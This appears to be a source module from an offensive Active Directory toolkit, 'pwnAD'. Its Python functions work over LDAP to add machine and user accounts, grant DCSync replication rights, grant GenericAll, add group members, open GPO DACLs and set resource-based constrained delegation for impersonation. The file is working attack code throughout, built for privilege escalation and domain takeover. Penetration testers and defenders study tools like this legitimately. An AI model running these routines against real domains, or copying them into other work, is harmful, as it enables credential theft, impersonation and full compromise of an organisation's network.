import copy
import logging
import random
import string
from impacket.ldap import ldaptypes
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM, RESULT_ENTRY_ALREADY_EXISTS, RESULT_INSUFFICIENT_ACCESS_RIGHTS, RESULT_NO_SUCH_OBJECT
from ldap3 import MODIFY_REPLACE, MODIFY_ADD, BASE
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control

from pwnAD.lib.accesscontrol import *
from pwnAD.lib.utils import check_error


def computer(conn, new_computer=None, new_password=None):

    computerscontainer =  'cn=Computers,' + conn._baseDN
    if not new_computer:
        new_computer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
    else:
        new_computer = new_computer if new_computer.endswith('$') else new_computer + '$'

    if not new_password:
        new_password = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
    
    computer_hostname = new_computer [:-1]
    newComputerDn = ('cn=%s,%s' % (computer_hostname, computerscontainer)).encode('utf-8')

    # Default computer SPNs
    spns = [
        'HOST/%s' % computer_hostname,
        'HOST/%s.%s' % (computer_hostname, conn.domain),
        'RestrictedKrbHost/%s' % computer_hostname,
        'RestrictedKrbHost/%s.%s' % (computer_hostname, conn.domain),
    ]
    ucd = {
        'dnsHostName': '%s.%s' % (computer_hostname, conn.domain),
        'userAccountControl': 4096,
        'servicePrincipalName': spns,
        'sAMAccountName': new_computer,
        'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
    }
    logging.debug('New computer info %s', ucd)
    logging.info('Attempting to create computer')
    
    try:
        if conn.exists(new_computer):
            logging.error(f"Computer {new_computer} already exists")
            return
        else:
            conn.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
            logging.info('Adding new computer with username: %s and password: %s result: OK' % (new_computer, new_password))
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)

    return new_computer


def user(conn, new_user, new_password, OU=None):

    if OU:
        container = OU + conn._baseDN
    else:
        container = "cn=Users," + conn._baseDN
    user_dn = f"cn={new_user},{container}"
    password_value = ('"%s"' % new_password).encode('utf-16-le')
    attr = {
        "objectClass": ["top", "person", "organizationalPerson", "user"],
        "distinguishedName": user_dn,
        "sAMAccountName": new_user,
        "userAccountControl": 544,
        "unicodePwd": password_value
    }
    logging.debug("Trying to add the new user")
    try:
        if conn.exists(new_user):
            logging.error(f"User {new_user} already exists")
            return
        else:
            conn.add(user_dn, attributes=attr)
            logging.info(f"User {new_user} has been created successfully.")
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)
        
    
def dcsync(conn, trustee):
    #Todo : check if account already have dcsync rights
    targetDN, targetSID = conn.ldap_get_user(trustee)

    res = conn.search(search_base=conn._baseDN, search_filter=f'(distinguishedName={conn._baseDN})', attributes=['nTSecurityDescriptor'])
    if res is None:
        logging.error('Failed to get forest\'s SD')
        return

    baseDN_sd = conn._ldap_connection.entries[0].entry_raw_attributes
    if baseDN_sd['nTSecurityDescriptor'] == []:
        logging.error("User doesn't have right read nTSecurityDescriptor!")
        return

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=baseDN_sd['nTSecurityDescriptor'][0])
    new_sd = copy.deepcopy(sd)
    access_mask = ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]

    for guid in ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c']:
        logging.debug(f"Creating new ACE for SID : {targetSID} and guid : {guid}")
        new_sd['Dacl'].aces.append(create_allow_ace(sid=targetSID, object_type=guid, access_mask=access_mask))

    try:
        conn.modify(conn._baseDN, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
        logging.info("Granted user '%s' DCSYNC rights!" % (trustee))
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def genericAll(conn, target, trustee):
    #Todo : check if account already have genericAll rights
    _, trusteeSID = conn.ldap_get_user(trustee)
    targetDN, _ = conn.ldap_get_user(target)

    res = conn.search(search_base=targetDN, search_filter=f'(distinguishedName={targetDN})', attributes=['nTSecurityDescriptor'])
    if res is None:
        logging.error('Failed to get forest\'s SD')

    targetDN_sd = conn._ldap_connection.entries[0].entry_raw_attributes
    if targetDN_sd['nTSecurityDescriptor'] == []:
        logging.error("User doesn't have right read nTSecurityDescriptor!")
        return

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetDN_sd['nTSecurityDescriptor'][0])
    new_sd = copy.deepcopy(sd)
    new_sd['Dacl'].aces.append(create_allow_ace(sid=trusteeSID))

    try:
        conn.modify(targetDN, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
        logging.info("Granted user '%s' generiAll rights over '%s' !" % (trustee, target))
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def groupMember(conn, group: str, member: str):

    user_dn = conn.get_dn_from_samaccountname(member, 'user')
    group_dn = conn.get_dn_from_samaccountname(group, 'group')

    conn.search(search_base=group_dn, search_filter=f"(member={user_dn})", search_scope=BASE, attributes=['member'])
    if conn._ldap_connection.entries:
        logging.error(f"{member} is already a member of {group}.")
        return

    try:
        conn.modify(group_dn, {'member': [(MODIFY_ADD, [user_dn])]})
        logging.info(f"{member} added to {group} successfully !")
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)



def write_gpo_dacl(conn, user, gposid):

    conn.search(conn._baseDN, '(&(objectclass=person)(sAMAccountName=%s))' % user, attributes=['objectSid'])
    if len(conn._ldap_connection.entries) <= 0:
        logging.error("Didnt find the given user")
        return

    user = conn._ldap_connection.entries[0]

    controls = security_descriptor_control(sdflags=0x04)
    conn.search(conn._baseDN, '(&(objectclass=groupPolicyContainer)(name=%s))' % gposid, attributes=['objectSid','nTSecurityDescriptor'], controls=controls)

    if len(conn._ldap_connection.entries) <= 0:
        logging.error("Didnt find the given gpo")
        return
    gpo = conn._ldap_connection.entries[0]

    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
    newace = create_allow_ace(str(user['objectSid']))
    secDesc['Dacl']['Data'].append(newace)
    data = secDesc.getData()

    try:
        conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(MODIFY_REPLACE, [data])}, controls=controls)
        logging.info('LDAP server claims to have taken the secdescriptor. Have fun')
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def RBCD(conn, target, grantee):

    success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
    if success is False or len(conn._ldap_connection.entries) != 1:
        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
        return

    target_result = conn._ldap_connection.entries[0]
    target_sid = target_result["objectSid"].value
    logging.info("Found Target DN: %s" % target_result.entry_dn)
    logging.info("Target SID: %s\n" % target_sid)

    success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(grantee), attributes=['objectSid'])
    if success is False or len(conn._ldap_connection.entries) != 1:
        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
        return

    grantee_result = conn._ldap_connection.entries[0]
    grantee_sid = grantee_result["objectSid"].value
    logging.info("Found Grantee DN: %s" % grantee_result.entry_dn)
    logging.info("Grantee SID: %s" % grantee_sid)

    try:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_result['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
        logging.debug('Currently allowed sids:')
        for ace in sd['Dacl'].aces:
            logging.debug('    %s' % ace['Ace']['Sid'].formatCanonical())

            if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
                logging.error("Grantee is already permitted to perform delegation to the target host")
                return

    except IndexError:
        sd = create_empty_sd()
        
    sd['Dacl'].aces.append(create_allow_ace(grantee_sid))
    

    try:
        conn.modify(target_result.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_REPLACE, [sd.getData()]]})
        logging.info('Delegation rights modified successfully!')
        logging.info('%s can now impersonate users on %s via S4U2Proxy' % (grantee, target))
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)
